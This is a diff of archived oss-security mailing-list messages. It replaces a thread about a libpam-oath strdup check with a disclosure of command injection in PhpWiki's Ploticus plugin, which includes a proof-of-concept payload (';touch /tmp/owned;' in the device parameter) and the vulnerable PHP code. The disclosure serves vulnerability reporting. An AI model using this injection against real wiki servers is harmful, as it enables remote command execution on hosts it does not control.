@@ -1,37 +1,118 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/11/07/9
-Message-ID: <87oasj4raq.fsf@hope.eyrie.org>
-Date: Thu, 06 Nov 2014 19:34:37 -0800
-From: Russ Allbery <eagle@...ie.org>
-To: Andreas Barth <aba@...us.org>
-Cc: oss-security@...ts.openwall.com,  742140@...s.debian.org
-Subject: Re: Re: Bug#742140: libpam-oath: PAM module does not check whether strdup allocations succeeded
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/08/27/5
+Message-Id: <20140827222345.2D3DEC0112@smtp.hushmail.com>
+Date: Wed, 27 Aug 2014 23:23:45 +0100
+From: "Benjamin Harris" <bch@...h.ai>
+To: fulldisclosure@...lists.org, oss-security@...ts.openwall.com
+Subject: PHP-Wiki Command Injection
 Content-Type: text/plain; charset=utf-8
 
-Andreas Barth <aba@...us.org> writes:
+Hi All
 
-> we have the following debian bug report about an security isuse in
-> libpam-oath (source oath-toolkit, upstream web page
-> http://www.nongnu.org/oath-toolkit/ ).
+OSS-Security, can I get a CVE for this please?
 
-> What is the appropriate process to get an CVE number on it? This issue
-> is already public, as it is documented in the debian bug tracking
-> system.
+URL: https://sourceforge.net/projects/phpwiki/
 
-Is not checking memory allocations for failure in this fashion considered
-CVE-worthy?  I'm probably missing something, but this seems difficult to
-exploit: the first strdup is only trying to allocate a byte of memory, and
-the second will not allocate more than MAX_OTP_LEN memory due to an
-earlier check.  This means the attacker would have to have essentially
-exhausted system memory already to force strdup to return NULL.
+I tried to report this a month ago, but got no response from the 
+developers. This is an old vulnerability I found while dusting off 
+some old hard drives.
 
-And, even if that happens, strdup returns NULL, which leads immediately to
-a NULL pointer dereference and presumably a process crash.  But to create
-this situation, the attacker has to nearly exhaust all process memory, and
-could just go a step farther and exhaust all memory, which would almost
-certainly result in a process crash anyway, or an OOM kill.
+Brief:
+-------------------------
 
-Am I overlooking something?
+PhpWiki is a WikiWikiWeb clone in PHP. A WikiWikiWeb is a site 
+where anyone can edit the pages through an HTML form. Multiple 
+storage backends, dynamic hyperlinking, themeable, scriptable by 
+plugins, full authentication, ACL's.
 
--- 
-Russ Allbery (eagle@...ie.org)              <http://www.eyrie.org/~eagle/>
+
+Details:
+--------------------------
+
+Straight command injection in the Ploticus module. Attached is a 
+working POC.
+
+I found these notes I made:
+
+<<Ploticus device=";touch /tmp/owned;" -prefab= -csmap= data= alt= 
+help= >>
+$ ls -la owned
+-rw-r--r-- 1 apache apache 0 Jan 18 15:23 owned
+
+
+vuln code with system execute at the bottom
+controllable param is $args
+           $gif = $argarray['device'];
+            $args = "-$gif -o $tempfile.$gif";
+                $code = $this->execute(PLOTICUS_EXE . " 
+$tempfile.plo $args", $tempfile.".$gif");
+
+['device'] is listed as an option by user when using the Politus 
+plugin
+"
+
+
+example usage;
+ <?plugin Ploticus device||=png [ploticus options...]
+     multiline ploticus script ...
+  ?>
+
+:>> 
+
+   function getImage($dbi, $argarray, $request) {
+        //extract($this->getArgs($argstr, $request));
+        //extract($argarray);
+        $source =& $this->source;
+        if (!empty($source)) {
+            if ($this->withShellCommand($source)) {
+                $this->_errortext .= _("shell commands not allowed 
+in Ploticus");
+                return false;
+            }
+            if (is_array($argarray['data'])) { // support <!plugin-
+list !> pagelists
+                $src = "#proc getdata\ndata:";
+                $i = 0;
+                foreach ($argarray['data'] as $data) {
+                    // hash or array?
+                    if (is_array($data))
+                        $src .= ("\t" . join(" ", $data) . "\n");
+                    else
+                        $src .= ("\t" . '"' . $data . '" ' . $i++ . 
+"\n");
+                }
+                $src .= $source;
+                $source = $src;
+            }
+            $tempfile = $this->tempnam('Ploticus','plo');
+            @unlink($tempfile);
+            $gif = $argarray['device'];
+            $args = "-$gif -o $tempfile.$gif";
+            if (!empty($argarray['-csmap'])) {
+                    $args .= " -csmap -mapfile $tempfile.map";
+                    $this->_mapfile = "$tempfile.map";
+            }
+            if (!empty($argarray['-prefab'])) {
+                    //check $_ENV['PLOTICUS_PREFABS'] and default 
+directory
+                global $HTTP_ENV_VARS;
+                if (empty($HTTP_ENV_VARS['PLOTICUS_PREFABS'])) {
+                    if (file_exists("/usr/share/ploticus"))
+                        $HTTP_ENV_VARS['PLOTICUS_PREFABS'] = 
+"/usr/share/ploticus";
+                    elseif (defined('PLOTICUS_PREFABS'))
+                        $HTTP_ENV_VARS['PLOTICUS_PREFABS'] = 
+constant('PLOTICUS_PREFABS');
+                }
+                    $args .= (" -prefab " . $argarray['-prefab']);
+            }
+            if (isWindows()) {
+                $fp = fopen("$tempfile.plo", "w");
+                fwrite ($fp, $source);
+                fclose($fp);
+                $code = $this->execute(PLOTICUS_EXE . " 
+$tempfile.plo $args", $tempfile.".$gif");
+
+Many thanks,
+Ben
+View attachment "release.py" of type "text/x-python" (1855 bytes)
